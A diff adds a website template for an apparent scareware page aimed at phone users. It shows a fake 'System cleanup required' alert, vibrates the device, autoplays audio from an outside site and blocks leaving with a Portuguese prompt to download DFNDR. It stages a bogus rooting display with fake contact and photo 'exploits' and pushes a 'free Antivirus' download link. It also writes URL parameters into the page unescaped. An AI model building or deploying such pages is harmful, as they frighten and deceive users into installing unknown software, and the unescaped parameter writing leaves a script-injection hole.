@@ -1,0 +1,68 @@
+{{ define "main" }}
+<body onclick="go();">
+<script>
+function getURLParameter(name) {
+    return decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+    );
+}
+</script>
+<script type="text/javascript"> 
+    alert("System cleanup required!\n\nPlease click \x22Install\x22 to install Antivirus program for FREE and clean yours phone!"); 
+</script>
+ <script type="text/javascript">
+        (function () {
+            navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+            navigator.vibrate([1000, 500]);
+        })();
+    </script>
+	<!-- (<script>var myTimer = window.setTimeout("alert('Error: 0x80072efd');",8000); </script> -->
+<!-- <script>var myTimer = window.setTimeout("alert('8DAE90AD-4583-4977-9DD4-4360F7A45C74, Error 91397D20-1446-11D4-8AF4-0040CA1127B6');",12000); </script> -->
+<script language="javascript">var PreventExitPop = true;function ExitPop() {if(PreventExitPop != false) {return "Para evitar danos, volte e baixe o DFNDR!"}}window.onbeforeunload = ExitPop;</script>
+<div id="textDestination" class="base type-text" title="">
+OS: 
+<script>document.write(getURLParameter('osversion'))</script>; 
+Device: 
+<script>document.write(getURLParameter('model'))</script>;  
+Browser: 
+<script>document.write(getURLParameter('browser'))</script>; 
+ISP: 
+<script>document.write(getURLParameter('isp'))</script>; 
+Rooting ................................................................<br>
+System login: root
+<br>Password hash: bmF4IHR1IGV0byBwZXJldmVsPyBIaSBmcm9tIEwzbjFuICkpKQ==<br>
+<br>Contacts exploit<br>...4hk34d8....skj5kfjkss........d7fd65............Ok
+<br>Photos exploit<br>...........aslk45fsd..........slxcb46d34.......Ok
+<br>Parsing logs <br>...................................................Ok
+<br>Password decode<br>.........</div>
+<div style="clear: both;"></div>
+<br><br><br>
+<div class="main">
+  <div class="t1">
+  Application update is available 
+  
+  </div>
+  <div class="t2">
+ <p>Software on your phone may be out of date. Installing the new Antivirus program update will update your Android version</p>
+    <p>Click the button below to install new Antivirus program for FREE.<br>
+    </p>
+  </div>
+  <a onclick="PreventExitPop = false;" href="/click">DOWNLOAD</a>
+</div>
+
+<audio autoplay="autoplay" preload="">
+    <source src="https://watcheth.net/eng_av_2/default.mp3" type="audio/mpeg">
+    <source src="https://watcheth.net/eng_av_2/default.ogg" type="audio/ogg">
+</audio>
+
+{{ range .Params.modals }}
+{{ $modal := resources.Get . | js.Build  | fingerprint }}
+<!-- Use this for external scripts -->
+<script src="{{ $modal.RelPermalink }}"></script>
+<!-- Use this for inline scripts -->
+<!--<script> {{ $modal.Content | safeJS }} </script> -->
+{{ end }}
+	
+</body>
+
+{{ end }}
